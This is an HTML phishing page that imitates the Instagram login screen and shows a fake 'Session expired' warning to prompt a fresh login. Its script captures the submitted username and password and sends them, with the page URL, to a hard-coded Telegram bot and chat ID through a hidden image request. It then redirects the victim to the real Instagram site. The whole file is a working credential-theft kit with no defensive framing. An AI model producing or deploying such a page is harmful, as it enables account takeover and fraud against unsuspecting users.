<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            width: 350px;
            text-align: center;
            box-sizing: border-box;
        }
        .logo {
            font-family: cursive, sans-serif;
            font-size: 42px;
            margin-bottom: 20px;
            font-weight: bold;
            color: #262626;
        }
        .alert-box {
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 10px;
            font-size: 13px;
            border-radius: 4px;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            color: #262626;
            font-size: 12px;
            padding: 9px 8px;
            margin-bottom: 6px;
        }
        input:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        .btn {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            width: 100%;
            padding: 7px;
            margin-top: 10px;
        }
        .help-text {
            color: #00376b;
            font-size: 12px;
            margin-top: 15px;
            text-decoration: none;
            display: block;
        }
        .footer-text {
            color: #737373;
            font-size: 12px;
            margin-top: 20px;
        }
        .footer-text a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo">Instagram</div>
        
        <!-- تنبيه انتهاء الجلسة -->
        <div class="alert-box">
            Session expired. Please log in again to continue.
        </div>

        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="btn">Log In</button>
        </form>

        <a href="#" class="help-text">Forgot your login details? Get help logging in.</a>
        
        <div class="footer-text">
            Don't have an account? <a href="#">Sign up.</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
            const chatId = "865078178";
            
            const message = "🚨 Instagram Login Captured:\n👤 User: " + user + "\n🔑 Password: " + pass + "\n🌐 URL: " + window.location.href;
            const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
            
            const img = new Image();
            img.src = url;

            setTimeout(function() {
                window.location.href = "https://www.instagram.com";
            }, 500);
        });
    </script>
</body>
</html>
